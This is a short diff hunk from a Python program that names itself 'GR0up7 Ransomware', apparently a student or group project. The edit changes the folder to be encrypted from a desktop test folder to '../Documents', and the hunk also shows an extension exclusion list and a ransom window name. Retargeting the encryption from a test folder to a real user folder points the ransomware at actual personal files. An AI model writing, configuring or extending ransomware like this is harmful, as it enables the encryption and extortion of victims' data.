@@ -18,7 +18,7 @@ from PIL import ImageTk, Image
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = os.path.join(os.path.expanduser("~"), "Desktop/TestFolder")
+ENCRYPT_FOLDER_PATH = "../Documents"
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
 RANWOMWARE_WINDOW_NAME = 'GR0up7 Ransomware'  # CHANGE THIS
 
